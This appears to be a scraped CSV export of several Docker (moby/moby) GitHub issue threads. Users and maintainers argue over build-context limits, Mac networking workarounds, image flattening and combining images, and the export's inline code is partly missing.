operations performed on bound filesystems mapped to a specific uid/gid as defined by the host.  FUSE is required because there is no way to do these mappings at the filesystem level. See ""shiftfs"" for an attempt to bring this into the kernel generically.  Would super be nice if docker abstracted something like that.  Could we have an an option to use FUSE on Linux then? This issue causes huge amounts of problems for devs who use linux in our organisation and maintaining workarounds to let them do their jobs is irritating. I accept that there will be performance issues with that - but since we mostly use Docker for Mac that's really not a concern for us. I'd rather have ""slow and working"" over ""fast but broken"" any day.  FUSE support would be awesome!  A lot better than setting up rsync scripts which I'm doing now which is a pain.  I've also considered adding ssh service to my containers just to use sshfs to work around this issue.  I've been experimenting specifically with a filesystem for mapping UID/GID's mapped for user namespaces...  something like this might work for mapping a name in the container to a name on the host... I'd leave that to people who are interested in this. I guess we already process /etc/passwd in the container for  (but it's horrible and doesn't work for some cases). ",34,0,243,0,0,204,15,
moby/moby/22753,0.069196741,moby,moby,No docker0 on docker for mac?,4473,55,39,0,6,"Output of  Output of  Additional environment details (AWS, VirtualBox, physical, etc.) Steps to reproduce the issue 1. 2. 3. Describe the results you received No docker0 and absolutely no way to connect to services running on docker host via bridge gateway. I have tried it all and thought I was going crazy, then I tried exactly the same things on my ubuntu host with zero problems Describe the results you expected I would like to be able to connect to my local redis and other services without having to dockerize these...  I just wanted to add a plus one/subscribe along with everyone else in this thread, and add another voice to the feature request of being able to easily access docker containers through the bridge interface on unique/custom IP addresses. I was ramming my head into the wall for at least 4 hours trying to figure out why I couldn't get any documented examples working, until I somehow found this issue, describing the problem perfectly. For now, the workaround mentioned by @friend ( seems to work passably well. I'm adding experimental Docker support to Drupal VM using the instructions  Add a host to  with  (e.g. ) Create an alias on the loopback interface  Bring up a container with the following pseudocompose version ""3"" services app  image image-name  ports    - 192.168.1.1008080    - 192.168.1.100443443  [...]    This seems to work perfectly for me, and though it currently requires a couple manual steps (which are avoided if using other tools on top of Docker... something I don't want to force my users to do), it allows me to almost reach Docker nirvana on Mac. So thanks for the workaround, and I hope you can find a way to get the bridge network working soon (or just abandon macOS &lt; 10.12 😏)  @friend thank you sooo much, 192.168.65.1 has solved my issue. I hope this doesn't get changed in the future, unless they find a cleaner solution. As of Docker for Mac 17.0.3.1 this has allowed my container to talk to the MySQL server running on my machine's localhost.  @friend I'm glad it worked for you. Thanks for the feedback!  Hi, I am reading the docs here  and I am trying to use the the special Mac-only DNS name mentioned there . If I do a ping on a terminal inside the docker container, it gets resolved to 192.168.65.1, and doing a curl to an app running on my mac retrieves the expected result. I am using this image  and I can open a Chrome browser there. So I wanted to go to  and the connection was refused. However, doing  works. Am I missing something? I wanted to start using the .  I think that using  was a poor decision. The whole point of containers is that they are portable and should have no dependency on what type of host they reside. If my team is half Windows users and half Mac, then the code inside of our containers will have to be configured differently. I'm glad there's a hostname approach, I just think the meeting where this approach was decided should have lasted 5 more minutes.  worked. Hilarious.  I worked around this problem by reverting back to docker-machine for Mac. The docker machine VM  is a Linux distro which means that it creates a docker0 interface which has access to the private network range of the docker containers. Then, on my host mac machine, I created a route for the 172.18.x.x address range of the containers which points to the ip address of the docker machine instance (192.168.99.100 in my case). This allows packets destined for the private container network to be forwarded by my mac OS to the IP address of the linux VM of docker machine, which knows how to reach the private containers and forwards the packets to them directly. Creating the route to the docker machine vm for the private container network You can get the address for the container network by using  or .  You can find ip of the host in docker for mac this way  I had the same problem whilst using osx on home wifi. In the office it worked fine on wifi yet i guess they have a typical office setup with ip addresses created on the fly. I ran the command  then i  looked at the ports section mine says 0.0.0.080 i didnt think it would work yet it did i tried that ip address in the browser and it works fine. I have also updated /etc/hosts on the mac to 0.0.0.0 for each domain and it works perfect. sometimes the simple and obvious is the best answer. )  Run this command  docker ps` if it says 0.0.0.0 then that  will  work fine once the port is exposed  or any other ip address written  there. ",11,0,141,0,0,99,2,
moby/moby/2745,0.040317595,moby,moby,"Add with relative path to parent directory fails with ""Forbidden path""",30187,355,229,0,10,"If you have an add line in the Dockerfile which points to another directory, the build of the image fails with the message ""Forbidden path"". Example Gives I would expect the file to be written to , not .  thought I had a good project folder. found out sym links and relative pathing doesn't work. this appears to be just an issue about where to source the files from, so it looks like we have to create two docker files. which is depressing  You have to review the Directory and are u familiar with OLE, registry, dos system, before you take into account open source project that is pretty much extensive research. Usually we take into account what needs to be in place before rewriting for open source.I don't know why GitHub came first into a entity catalog. No proposal was in place for the designated  doc to be available. No request was sited. We don't shift the focus on and off so people can generalized on how linear regression analysis should have been to the rest of the world at large. Hope you get my drift!! Wishing the best..... Cheers, -Moderntheory On Apr 29, 2017 207 PM, ""Eric Xanderson"" notifications@friend.com wrote  So much for running a microservice architecture with multiple repositories and Dockerfiles. / Please reopen.  This is something that baffles me also.  I just ran into this limitation, and I can't see any reason for it.  To say this is a security issue due to malicious people placing bad lines in their Dockerfile and then telling people to clone, build, and publish the image is utter and complete nonsense.  If I pull a Dockerfile from the Internet (github or whatever) and blindly follow orders without looking at the file to create an image that I subsequently blindly and naively publish to a public repository, I will reap what I deserve.  To limit the product for that edge case is specious logic at best. It's frustrating to see so many people speaking out with user experiences just to get shut down, ignored, and brushed off by a small number with a concrete, inflexible, uncompromising, and narrow worldview of how they want their software to be.  So many great ideas have withered and died from that kind of creativity-strangulation.  Docker might be on that slate pretty soon, if these frustrations are significant to more than just this one issue.     @friend - you hit the nail on the head. i would like to use docker, but this issue is show-stopper for me and I suspect many others. I take responsibility for what software I choose to remotely include as part of my own and I don't need/want authoritative hobblings of what I can do with software and which effectively take away my responsibility with the lame excuse/insult that I (and the larger group of my peers) am irresponsible. I build my own dockers from the ground up anyway so that ""security"" issue does not apply in my case. If they want to continue with this foolishness, they do it at their peril because there are competitors nipping at their heels - I'm just doing my research on  - I haven't yet fully understood if it is the replacement I'm looking for but I suspect it will be the docker killer.  @friend @friend @friend  As it has already been mentioned numerous times it's not purely a security issue. Docker has a client-server architecture. Docker builder is currently implemented on the server side. So if you want to use files outside build context you'd have to copy those files to docker server. One things docker newbies don't realize is that you can keep Dockerfile separate from build context. I.e. if you have , ,  you can still set build context to root. But the next thing you'll complain about is that build would take prohibitively long as you now have to copy whole  directory to the machine where docker server resides.  @friend Regarding a security issue consider this You're a docker hosting provider (or CI) and allow people to upload their git repositories with Dockerfiles. Since you want to be as efficient as possible, you implement your service with docker containers. If you allow people to reference any files on your server you'd risk that people would be able to expose images to each other. How would you solve this?  @friend Packer is not a competitor currently. It's a tool to build VM images. Though I can imagine packer to be able to build container images at some point.  @friend Why aren't you satisfied with my comment? Doesn't it sound reasonable? Do you have any questions remaining? Do you have a solution to the problem I described?  @friend  You run people's dockers inside their own containers.  @friend So you propose to use docker in docker to build images? It would be very inefficient and still insecure. The kernel is shared however deep DinD you use and since docker has root privileges it's hackable.  Sorry, I don't understand what's the meaning of ""dockers"" here.  I suppose it could be a Docker in Docker but there are many options for virtualization depending on your platform.  @friend So, can that not be done automatically?  If I specify a file out of the context, is it not possible and/or feasible to automatically copy it to the server in order to build it into the image? So, the unfortunate haughty attitude to your ""newbie"" users aside, this is actually what has already been suggested (by @friend  above), and as I stated in my own post, this is the solution I am currently using.  This works for me.  However, if I had multiple, shared config, and my individual docker images were rather big, this would get fairly prohibitive, as it has been stated by others that each docker image would contain the files for every other docker image, even though it would never need them.  I could easily see why people would be frustrated by what they could easily see as stonewalling in refusing to work with users' requests and needs and implement this feature.  Won't you as easily see why maintainers be frustrated? If you read the docker history, you'd know that this whole ""docker"" concept was developed in-house (in ""dotCloud"" then) as a tool to efficiently use server resources. No, it's not ""setting up a situation"". It's a historic fact. Sure. Just like in any ""as-a-service"". There would be only one docker daemon, so yes. Otherwise you'd need to set up a separate docker daemon for each user which is impossible on one host (so would require actual virtual machine for each user, rendering containers and docker meaningless for that use case). It is not a security concern for running containers (since kernel isolates them), but it is a security concern when there are no containers yet (when you're building images). You're still saying as if each user runs a separate process. It's a server, remember? There's only one user. And one filesystem. That would require implementing application layer of access control on top of the system one. You're not forced to use docker to build images. Container image format is currently being standardized. So there are other tools you can build images with. When image is build, push it to image registry so that docker can pull it. And I'm sure when the build tool would be extracted out of the server monolith (#32925) relative path use case would be possible as the builder would run in a separate process under ""normal"" user.  I'm running into this issue as well in a Go project. Here's how this became a problem for me I want to run a container for developing my server locally, which has the following approximate structure Inside of my Dockerfile, there are two options I can think of here  ADD ../ /go/src/MyOrg Only add the main package and then install the dependencies from the repo  The first option doesn't work because of this bug The second option isn't only awful, but doesn't work because of moby#24489 and MyOrg happens to be bristling with private repos My only other option is to put all the dependencies into the vendor file Now if I ever want to update Dependency/dep.go I have to run a script to manually copy Dependency folder into the vendor folder. Just bizarre.  Wouldn't it be trivial for Docker to do quick static analysis and detect whether a relative parent directory is being accessed? Then when you try to run or build it, it would abort saying Even if you can't analyze it before running the Dockerfile, then just abort with the same error message when you encounter the offending instruction.  @friend It looks like you want to link statically with some library? For production image, I see 3 solutions 1) Treat it as a thirdparty library with its own release cycle  Publish  using go package manager In  fetch all dependencies using go package manager  2) Treat it as a part of your application with synchronous release cycle  Move  to  Add additional  if you want to release Dependency separately  3) Move Dockerfile to For development image there's a 4th solution 4) Just use docker-compose  use image with Go build tools mount  to  use go command to build normally as you would without docker   Your #2 is a non-solution if the Dependency is used by more than one MyOrg projects, which, if I understand correctly, is the entire point of @friend's setup. 3 also breaks once there is more than one top-level project. That really leaves us with just solution #1, which is a lot of hassle for something that should be a non-issue. Virtually every build system on the planet supports this setup (e.g. CMake's  actually lets you ascent into the parent directory etc.); Docker is the special needs child here )  Dependency management is always an issue. Often there's a temptation to dump everything into one repository (like they do at Facebook and Google), but it's not an option in the open source community. And when you have multiple repositories you must either use git clone or some other package source. The thing is, docker is not a build system. It's not designed as a build tool. Build functionality is only a necessity and it has very limited capability. You can't use multiple Dockerfiles to build one image (without intermediate registry step), you can't import Dockerfile (you can only use other image as a base), there were no multistage builds until recently. So yeah, if you need a build tool, use CMake (or ) and then just add artifacts to the result image.  So why can't we do this? A tool should not be enforcing it's own ideology onto it's users when it's designed to be as versatile as possible.  plus one. Basically I have a JAR file for instrumentation that needs to be in every single micro-service, but is quite large. Due to change in infrastructure (Rancher for orchestration instead of ad-hoc docker scripts) it will no longer be ""easy"" for me to mount the JAR for instrumentation in the target container at runtime, so I need to supply it to Dockerfile and copy it inside the container at build time. Well, the JAR is quite big so it is in the parent directory of all the micro-services directories (each containing their own Dockerfile) Due to this ""limitation"" I am force to copy/clone a 50MB+ JAR into every simple micro-service (10+) directory... Not healthy for my co-workers machines or the Git repository. Providing a flag such as  to docker build would not be outside of the realm of possibility. The Dockerfile would have to be pre-processed before bundling the context to analyse dependencies from outer directories which would then be added to the context bundle, right? In my mind this does not look like a very far-fetched feature-request - but rather quite sensible usage. Cheers Dan  Just FYI to anyone here, the best solution I have found so far, was to simply to simply copy the Dockerfile to the root of the project and give the file name a uuid. after building, then just delete the uuid file. worst case is the Dockerfile doesn't get deleted, but it's a uuid, so it shouldn't really matter. I tried symlinks up the wazooo, did not work. Copying the file to the root of the project the uuid isn't as pretty as symlinks, but it does work.  You can just build the Docker context directly  If JAR file is static you shouldn't include it to your git repository. Here's a proper way  Build a base image (e.g. ) with JAR file included Create a Jenkins (or other CI) pipeline where you build and push the  image to the registry On each microservice's Dockerfile use base JAR image    You can use multi-stage builds; Create a Docker image for your packages (or build several of such images) Dockerfile FROM scratch COPY instrumentation.jar / bash docker build -t my-packagesv1.0.1 -f Dockerfile.packages . Dockerfile FROM my-packagesv1.0.1 AS packages FROM nginxalpine COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM mysql COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM my-other-packagesv3.2.1 AS other-packages FROM my-base-image COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar COPY --from=other-packages /foobar-baz.tgz /some/other-path/foobar-baz.tgz ♠  @friend The trick I've used in the past is to use symlinks and then rsync everything with symlink resolution to a separate folder for building. It doesn't really work if you have really large files in your build, but for most use cases it's a workaround that can get the job done.     @friend  thanks, I will look into that...I have to support generic building of projects for the purposes of library code, so the stupid trick of copying the Dockerfile to the project is the only lightweight thing I can think of, where the only thing being copied is the Dockerfile itself. Seems dumb but works lol.  This is extremely unfortunate. At this point, it's physically impossible for me to add any new ideas, since all of them have already been brought up. But for some reason, the Docker people seem to keep complaining about security aspects. This makes less than zero sense just add an  flag, which is disabled by default. Boom everyone is happy. Can we stop pretending that security is a concern here? If the attack vector is that an attacker somehow convinced me to run  on their , then I think I'm stupid enough that they also could have convinced me to run .  I think you're missing one important difference docker runs in a superuser context. And no, you're not supposed to be stupid to be convinced to clone some project from GitHub and run .  LXDock is interesting  the warning - duly noted and highly appreciated )  5 years later and docker still issues this cryptic error message that rivals ones from nuget. How about at least putting in ""Even though you are in path X when you issued the  command, and your dockerfile has a path relative to X, and you have specified a working directory in the dockerfile, docker is going to be working in path Y (ps. u r stupid noob)"" At least I think that's what the obstacle preventing me from completing a basic walkthrough.  This tech seems great and all, but I shouldn't need to spend a few weeks researching the ins and outs and dealing with 5 year old bugs like this just to try it.  This appears to still be a bug, at least is presenting itself today in what feels like a very routine use-case.  It certainly feels at first. But not after you learn how to mount your source and build directories, which is a recommended use case for development. You aren't supposed to rebuild your images on every source change. When you're comfortable with development use case, you can proceed to production use case, at which point you create  and use  to point docker builder at the root of your project. Then you realize that not all the files in your project are required for production. You begin to optimize it by creating build image and using build artifacts folder as a context for you production build. Then you learn about multistage builds and which point you're comfortable with a setup you have. If you need to put in your image something else from your HOME folder, like your private ssh keys (not a brightest idea), you can copy them to your project dir (surely you're not worried about security) or even commit them to git.  I just ran into this issue as well. Is there a reasonable workaround? I just want to mount a folder that is not in the docker folder...  All this ""mount"" talk and ""Home folders"".  If anyone is going to fix the error to be more clear, please remember that some of us have C drives and %USERPROFILE%.  The way it works on Windows is network shares which is kind of a mount.  Windows has actually had mounting for a long time, its just transparent to users unlike nix, I just didn't want to be further confused by nix specific messages while trying docker out on windows. Why would I create a network share to run a docker image on the host running on my local machine? That seems ""extra"", but if the error message said that was the problem I would fix it and not come bothering anyone.  If you're talking about Docker on Windows, it still uses linux in a VM.   When you run  it actually zips your src folder and transfer it to the docker server which executes commands from your .  It looks like there are some people who want to reference any files from the . But Dockerfile parsing is done on the docker server. So there's no way it could know which files are referenced. Some people are asking to change message from ""Forbidden path"" to something more understandable. Does the message ""Can't reference files outside build context"" make sense to you?  So if I have a dockerfile like this... ... and run a command to publish a new empty Asp.net (not core) web app (dockerfile inside folder) ... ... the  error that crops up (that talks about a path I have specified nowhere) is talking about it from the context of the ""Docker Server"" box in the picture above? I did try changing the COPY to various relative and absolute paths, but nothing stopped producing that that error, or caused a different one to happen. I'm only on this thread as its the only place I could find that had mention of the random temp\docker-builderNNNNNNNN folder that does get created locally on my windows pc (maybe on the Docker Server as well. but I can't tell). The local folder is removed almost immediately. If what I'm describing isnt for the same issue as this very long and meandering thread, please say so and I'll open a new issue. No, because of two things  despite the name of the command I am executing, I'm not compiling anything. I'm deploying something already built to a container to create an image.  It doesnt tell me what the build context is. ""Build context"" is meaningless without some concrete bit of info like the context's path or environment variable or the referenced file paths.   Well, you're compiling an image. Even though you have already ""built"" a thing you want to put into an image, you have not built an image. Well, errors should not replace documentation.    I see what you're trying to do. It looks like you have not read the  reference or  help.  You have ARG source specified but you haven't provided an argument for it, so the default value of  kicks in First argument of docker build command is a . You would know what is a build context if you had read how to use  before running this command. The error essentially tells you that there's no  in .   Also, it looks like you're running Windows containers (native docker server) which do not require VM. This technology is still experimental, so you may experience a bug.  plus one for allowing something like 'COPY ../../src' I'm sorry, but any environment that pushes developers to use so clumsy project structures will never mature and leave the mickey-mouse stage. This is not how successful products evolve and no PR hype can be a saver for long. Docker team, please propose some viable solution.  @friend - I should not need to digest tomes of information just to ""get started"". I already had to get permission to temporarily uninstall antivirus that was interfering with docker. The paths used in the build context shouldn't be somewhere other than where I'm executing the command or the program folders. A common temp location is ok too, but only if it doesn't require additional permissions, which I think is what you are saying this needs.  Super clean and direct and works fine, at least for me  @friend Yes, this is tutorial describes how to set a context directory. Which implies that the problem here is that  is not descriptive enough People should refer to extended description on the website  which it's quite easy to grasp what ""Forbidden path"" really means. It doesn't have anything to do with permissions. @friend Writing Dockerfiles for your project doesn't sound ""get started"" to me. It requires quite an advanced knowledge. Getting started tutorial describes setting up very simple project that doesn't require any prior knowledge. But if you need to setup anything more complex you must know how Docker works. And yes, it requires quite a lot of time to figure out.  When something exists but you are not permitted access to it, it is forbidden. If its not a valid for some other reason, its Invalid for some other reason. I started with the one that is created when adding docker support to a VS project. It would run in a debugger but that isnt very useful if I need to make a deployable image. Trying to use the CLI to build the image outside of VS just reports the temp folder error.  The file looks correct ... ""Docker, build using this folder and the docker file in it."" seems to be what the CLI help tells me this means.  Nothing about a build context or additional paths, just the one path to direct it to, be it a filesystem path, or a URL, or a ""-"" (the dash must be a *nix convention). The command looks correct...  Both the command and the dockerfile look correct, yet it does not work.  In Unix,  usually means ""short help"". If you need extended info you should use   don't see how this problem you have is related to ""Forbidden path"" issue. Error message tells you that there's no folder named  in . Where do you see ""Forbidden path""?  You are applying the word with an incorrect meaning. I don't mean offense, i can only speak in one language and you clearly can communicate in more than one. Personally I would rather be corrected than to continue to speak incorrectly. if  is the short help (that goes on for a few screens worth of console), then what is  ? That usage example says run the executable ""docker"" with command (option) ""build"" and give it a path. And then says ""build an image from a  docker file"". So the path must be to the docker file, yes?  If there are other params required it should say that, not make me look up ""man pages"". I still dont understand why its choosing to use the temp folder and then complaining about it when I gave the path to the docker file as the parameter and that has a relative path in it.  ♠PATHDockerfile-fPATHobj/Docker/publish` by the look of it.  It doesn't have to use the temp folder, it's just an implementation detail. What really happens is that it uses a remote build. I.e. while physically it's just a different location of the same machine, logically,  doesn't build on your local machine, it builds on the remote machine. So you must provide all the files the build needs inside the directory or tarball specified by PATH or URL so that these files are copied to that remote machine and used to produce an image. This approach is called ""the client/server architecture"". That is also a Unix convention  flags that are composed of one letter are specified using a minus (). They usually have an expanded version that has identical meaning, but longer to type (). This sounds like a valid point. Please create a new issue if you want the  to be changed to be more descriptive.  I hit this all the time with go projects, where it is common for packages to live at the root of the project, and not in the buildable command directory (where i want the Dockerfile to live). I can't build the Dockerfile and use the newest version of the utilities dir if I buil from the  directory. I could of course run  in my Dockerfile, but often times I want to use the local (modified) versions of my packages that are not yet published upstream. Here are the workarounds I've come up with (some seen in this issue) Move Dockerfiles to project root Move your  to the root of your project and re-factor it to add files and directories from the project root path onward (.  Cons Some people have huge projects and Docker uploads the entire ""context"" its running in to whatever the building server is, which is sometimes a remote server over VPN. This is too slow for some people.  Make a temporary dir for outside dependencies Create a  in your  directory that copies in outside dependencies to a temporary directory, then calls .  Refactor your  to add files from the temporary directory created in your  when building.  Have the  then call a clean that deletes the temporary directory.  Cons Your  may break, leaving garbage duplicated files around.  You can make this less of an issue by adding the temporary directory to a  file.  Run Dockerfiles from root context Run your  from the project root ""context"", but let it keep living in the  dir.  Refactor the  to add files relative the root of the project ().  Cons Still does not work with huge repos, that end up shipping the entire project to a remote docker server in some environments.   @friend Read above the recommended option do not use Dockerfile for development. Use go base image + docker-compose + mounted folders.  After 153 comments I would have figured this would be understood as a basic needed feature... using asp.net, the build is based off of a directory. If you're recommending me to have separate csprojects just for a docker build, that is crazy. The official dotnet-core-architecture example shows building outside of docker, then just copying the built contents into a docker container... that can't seriously be the considered way of doing this.  @friend A lot of people confuse docker build and Dockerfile with build scripts. Dockerfile was never intended to be a general purpose build tool. Though you can use Dockerfile this way, you're on your own with it's caveats. Yes, if you want a production image, you should run a container to build your artifacts and then copy these build artifacts to the place where Dockerfile is located or change the context to the directory with your build artifacts.  See it this way Dockerfile is a set of instructions to copy your runtime files to an empty docker image.  @friend that's the point of multi-stage builds, correct? If project B references project A, project B won't build, because it expects a csproj reference to to the project, not to a dll reference, even if you get the artifacts of project A, unless you make a separate csproj to reference by compiled dll instead of source, it won't build. And ya, I am confused what you mean ""docker build vs dockerfile with build scripts"". Docker build is for Dockerfile, correct? If not, I don't feel that should be the description on the top of the Docker Build page P  So you're saying you're using csproj files to build multiple projects simultaneously? In this case you need to access all the source files, which is 800 mb in your case. I don't see what you expect. You either build them inside or outside a container. In either case you'll end up with dll and exe files which you then put into an image  I don't understand why this needs to keep being stated... Structure  Libraries --- Library 1 --- Library 2 --- Library 3 APIs --- API 1 - reference library 1 --- API 2 - references library 2 and library 3  If I request API 1to be built, i do NOT need to send library 2, library 3, and API2. I ONLY need Library 1 and API 1. This is a C# project reference &lt;ProjectReference Include=""..\..\..\BuildingBlocks\EventBus\EventBusRabbitMQ\EventBusRabbitMQ.csproj"" /&gt;  Your Options A. Change Project Reference's to local dll's, destroying all intellisense for every library B. Hot-Swap project references to specifically only build for dll as needed for each individual docker build, (hundred of hot swaps, sounds fun) C. Send 800mb per build, when only 2 of those are actually needed D. Don't use Docker for anything build related, one of the main reasons I want to move to docker. E. Fix Docker and make everyone happy.  The daemon still needs to have all files sent. Some options that have been discussed;  Allow specifying a  so that multiple Dockerfiles can use the same build-context, but different paths can be ignored for each Dockerfile ( reverse allow specifying multiple build-contexts to be sent, e.g.   Inside the Dockerfile, those paths could be accessible through (e.g.)  Yes, I was going down the line of the multiple build contexts. That looks beautiful and would love that feature! Didn't see it portraid quite that way but that looks great to me at least  @friend I didn't say so. I said ""don't use Dockefile for anything build related"". You could perfectly use Docker for builds docker-compose run api2`  @friend Multiple build context sounds exactly what I am looking for! How soon can we see this feature?  So far it has just been a possible approach that was discussed; it would need a more thorough design, and also be looked at in light of future integration with  (which has tons of improvements over the current builder, so possible has other approaches/solutions for this problem) I can open a separate issue for the proposal for discussion; if design/feature has decided on, contributions are definitely welcome  I resolved with a workaround... Created a docker-compose for build and in original docker-compose generate image for production See  I just encountered this issue. I have multiple multiple dockerfiles and a docker-compose housed in one repo that fires up. I've been using an nginx container to proxy my client-side code with the backend, but I am not trying to dockerize the webpack configuration so that it will copy over the code and watch for changes. I've run into this forbidden issue, since my COPY command has to reach into a sibling directory.  Opened  with a proposal for multiple build-contexts ",111,55,1005,0,0,738,30,
moby/moby/332,0.089144435,moby,moby,flatten images - merge multiple layers into a single one,1045,12,3,0,0,"There's no way to flatten images right now. When performing a build in multiple steps, a few images can be generated and a larger number of layers is produced. When these are pushed to the registry, a lot of data and a large number of layers have to be downloaded. There are some cases where one starts with a base image (or another image), changes some large files in one step, changes them again in the next and deletes them in the end. This means those files would be stored in 2 separate layers and deleted by whiteout files in the final image. These intermediary layers aren't necessarily useful to others or to the final deployment system. Image flattening should work like this  the history of the build steps needs to be preserved the flattening can be done up to a target image (for example, up to a base image) the flattening should also be allowed to be done completely (as if exporting the image)   It's been over a year now, any plans to introduce the ""--squash"" option into the CE codebase other than via the ""--experimental"" way. ",5,0,30,0,0,10,0,
moby/moby/3378,0.209497185,moby,moby,How do I combine several images into one via Dockerfile,16421,217,137,0,13,"I have several Dockerfiles to build images which eg setup a postgresql client, set up a generic python app environment I want to make a Dockerfile for my python webapp which combines both those images and then runs some more commands If I understood the docs correctly, if I use  a second time I start creating a new image instead of adding to the current one?  Here's the thing, I don't necessarily need merge. I think a lot of the problems could be solved with a rebase. My normal use case is A (ubuntu) -&gt; B (e.g. nginx) A (ubuntu) -&gt; C (e.g. node) And I want a combined B &amp; C image. Usually they don't have anything to do with each other, so it would be sufficient just to rebase all the diffs between A and C onto B. i.e. A -&gt; B -&gt; C' That seems like a simpler problem to solve.  @friend Typically Node.js applications don't need this feature to work with Nginx (in my opinion). Docker way would be two containers, one for Nginx, the other for Node. We configure Node container to expose its port only to the Nginx container, and let Nginx container to listen to the public port (like 80). Any reason why Nginx needs to be in the same container as Node?  @friend I appreciate the reply. I actually just used two random services as an example. My usual use case would be starting with a generic service (e.g. node based off of ubuntu) and a custom image of my own (also based off of ubuntu) and wanting to combine them.  btw, it's not exactly rebasing but opens up a lot of use-cases for Dockerfiles. Dockerfile now supports multi-stage builds. Example You can have as many stages as you like. The  parameter basically switches the context to the specifed build target name. When you , the resulting image called  will be from the last stage. You can also build specific stages with , for example. There's a few other very nice Dockerfile enhancements in 17.05 (currently available as RC1), give it a try!  Now that is interesting! I didn't know you could do that. I'll have to give that a try to see if it solves my common use cases.  While this is a great feature, having tried it out it doesn't really solve my most common problem. I just ran into it again today. I would like a Jenkins image that has Docker installed so that I can build from within the container. The fact of the matter is that there's no way to do this without replicating the install process of one or the other in my Dockerfile. This is a case where the blinkered arguments about this not being necessary since each container should only be one service obviously don't apply. My ""one service"" combines the functionality of Docker and Jenkins.  So you want to smash two dockerfiles into one so you don't have to copy/paste stuff?  Copy/paste is the equivalent of forking in this case. What I want to do is avoid forking a Dockerfile so I don't miss out on bug/security improvements or other changes when it invariably changes later on.  Can't just pass by. Looking for a way to distribute changes over a long chain of images inheritance (deeper than 2). Multi-stage doesn't seem to be the thing that claryfies a problem. Having an entity that could contain just block of directives, allowing me to include it into all my inheritor images, together with base image functionality looks like rational evolution.  For those wondering the right way to do this, from a Docker perspective, take a few minutes to review  he creates an entire tree of Dockerfiles.  As you go down the tree, you find different combinations of dependencies, each FROM the level above in the tree.  So if you followed the tree from  -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;pyTorch  + -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow-pyTorch` Now, you still have to make a dockerfile that combines pyTorch and TensorFlow dockerfiles, but they key is that those files will be VERY SIMPLE, just a couple lines of install on top of deepLearningBase. So what is really needed is for several Larger-scale github repositories like this, for different ""worlds"", such as Web Development, Deep Learning, Embedded software, etc. Then you would just follow the tree to your required build, and if no one else made it yet, just add a node and combine 2 or 3 apt-get lines and make your new environment.  That looks like the ""choose-your-own-adventure"" style of composition. INCLUDE would be a lot simpler. Hell, I just want to compose a specified  image with  so I don't have to install nano from apt-get every time!  I concur with @friend in his above comment. There's no reason this shouldn't be possible in most cases (conflicts should be fairly rare, as they are on manually-managed OSes).  I have introduced a YAML configuration file which allows macros  This is a use case quite similar to the one @friend commented, where neither @friend 's solution, neither multi-stage builds commented by @friend apply  A (debianstretch-slim) dockerfileAB -&gt; B (pythonslim-stretch) dockerfileAC -&gt; D ([build-stage] python-slim) dockerfileDE -&gt; E (ghdl/extvunit)     dockerfileAC -&gt; C (ghdl/runstretch-mcode)    where  The steps from A to C are exactly the same as those from B to D (dockerfileAC). The development team of B knows nothing about C, D or E. The development team of C knows nothing about B, D or E.  A user willing to build D (and/or E), must have access to dockerfileAC, but it is not required to know about dockerfileAB. Therefore, the user must have a better understanding of one dependency (C) than the other (B). Ideally, it should be possible to rely on teams A and B, and just build D as either  (merge) or  (rebase). Because GHDL is not a web service and VUnit is not a web client, both tools need to be installed in the same image/container (E). Multi-stage builds are not useful, because we need to build a (probably unknown) dockerfile with two  labels, it is not a single forward chain. If find this use case similar to the merge/rebase of two git branches sometimes there are no conflicts, sometimes the conflicts are easily resolvable, sometimes it cannot be merged at all because there is no common history... Is there any tool, either official or external, that provides this feature?  Amazing this is still an issue and topic. How hard is it to ""INCLUDE someimage"", then when parsing it, check the base is compatible (in the FROM chain) and if so, execute the rest of THAT file at that point (as if I had copied the Dockerfile from the project and pasted it into mine)? The whole ""people will do bad things they don't realize"" excuse is absurd in this context. This is already insanely complex and that why we need this to help simplify it.  @friend This is an entirely unhelpful comment. There are basically two reasons for it's why it's not one, either  It's not so easy No one has taken the time to do the work.  In reality, it is usually both.   It's a parsing and string-replace problem that any new coder could accomplish in all of 10 minutes IF they knew where in the code. I'm not saying it would be usable in all cases, but for the limited cases I'm seeing suggested here over and over (where bases are effectively common), it's a dead-ringer.  Of course not, this thread provides ~101 reasons it can't or shouldn't be done, so why would anyone think to do it regardless?   On the other hand, my comment serves (like SO many others here) to demonstrate that there is a need and with the hope to influence either the obstructing attitudes or to at least act as a reminder. If that's ""entirely unhelpful"", then you've just explained why this issue (ignored feature request) is still here and active and it's not a technical one and I'd point to your hollow post with little in the way of helpful facts, information or even opinions.  It's way more than parsing a string. Docker and the Dockerfile is used by millions of people. Adding API's is a significant thing... even outside of that the underlying implementation is not ""parsing a string"". In any case there's many proposals to solve the problem and this is a very old and closed issue.  I do think that if Docker doesn't figure out a clean solution to this scenario, it will probably be replaced by whatever tool does figure it out. I noticed one of my colleagues using the following pattern, which might be a decent workaround I haven't tried it myself though, so I'm not sure how it would work in practice, e.g. how it behaves with caching, etc.  Indeed, this is a very important problem, and hasn't been addressed properly. I'm amazed a company as big as Docker haven't tackled it yet.  Just my two cents... I am just learning more about Docker at the moment and I feel something like INCLUDE would be very useful. I liked the multiple inheritance example above and wanted to address the comments about possible problems and conflicts with it. Multiple inheritance is hard in any language that supports it but when a conflict occurs it's the responsibility of the Docker file creator to rethink what they are doing and start again. Docker should just build the image and not try to prove the build has no issues.  @friend I have support for macros in   I could support ""include"" too.  That would be missing the point.  The goal is not to include the Dockerfile definition.  The goal is to include the docker image.  This is going to seem absurd because it is off the top of my head from fedora include ubuntu /ubuntu include debian /debian Reasonably I would expect this to start off with the image of fedora.  Then add the image for ubuntu under the folder /ubuntu.   Then added the image for debian under /debian . This is of course absurd, in that why do I want to mix a bunch of operating systems into one image?   But a more useful example might be from fedora include plex /plex include commericalremover /plex/add-on/commericalremover Now in this case it makes more sense.  In that if these are other images don't have operating specific components I have an easy way to make things modular. On Wed, 8 Aug 2018 at 1548, Arkady Miasnikov notifications@friend.com wrote  That last one is possible already;  accepts both a build-stage, or an image, so for example; Edit; or to take the actual example;  Exactly.   Which is why I would consider the 2017 update that added ""COPY --from"" as having completed the 